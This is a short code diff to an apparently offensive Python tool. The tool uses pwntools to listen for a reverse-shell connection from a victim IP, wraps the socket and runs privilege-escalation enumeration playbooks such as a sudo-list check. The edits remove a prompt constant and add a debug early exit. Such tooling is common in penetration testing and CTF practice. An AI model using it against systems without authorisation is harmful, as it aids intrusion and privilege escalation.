@@ -9,8 +9,6 @@ from playbooks.enumerate.sudo_list import EnumerateSudoList
 import pwnlib_socket_wrapper
 import utilities
 
-EXPECTED_PROMPT = b'$ '
-
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-v', '--victim_ip', required=True)
@@ -30,7 +28,7 @@ def main():
     pwn.context.log_level = 'error'
     with pwn.listen(args.port).wait_for_connection() as client:
         print('Connected!')
-        socket = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, EXPECTED_PROMPT, attacker_ip)
+        socket = pwnlib_socket_wrapper.PwnlibSocketWrapper(client, attacker_ip)
         shell = pheelshell.Pheelshell(socket)
 
         print('Running startup enumeration...')
@@ -61,6 +59,9 @@ def count_matching_starting_characters(substring: str, string: str) -> int:
     return count
 
 if __name__ == '__main__':
+    main()
+    exit()
+
     try:
         main()
     except KeyboardInterrupt:
